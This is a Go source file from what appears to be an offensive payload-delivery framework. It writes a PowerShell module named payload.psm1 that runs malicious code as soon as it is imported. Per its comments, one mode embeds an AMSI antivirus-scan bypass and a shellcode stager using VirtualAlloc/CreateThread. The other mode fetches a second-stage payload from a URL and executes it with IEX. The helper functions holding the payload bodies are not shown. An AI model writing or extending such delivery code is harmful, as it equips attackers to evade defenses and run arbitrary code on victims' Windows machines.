// psm1.go — emit a PowerShell module (.psm1). Top-level code in a .psm1 runs on
// `Import-Module .\payload.psm1`, so inline mode embeds the full AMSI-bypass +
// VirtualAlloc/CreateThread stager (ps1StagerBody, the same body -f ps1 emits);
// remote mode does an IEX download-and-exec of the --url stage-2. A .psm1 is
// also runnable via `powershell -File payload.psm1` like a plain script.
package delivery

type psm1Emitter struct{}

func (psm1Emitter) Name() string { return "psm1" }
func (psm1Emitter) Ext() string  { return "psm1" }

func (psm1Emitter) Emit(s *Spec) ([]Artifact, error) {
	var body string
	switch {
	case s.Remote():
		body = ps1Fetch(s.URL) + "\n"
	case len(s.Shellcode) > 0:
		body = ps1StagerBody(s.Shellcode)
	default:
		return nil, errPayloadRequired("psm1")
	}
	return []Artifact{writeFile("payload.psm1", []byte(body))}, nil
}
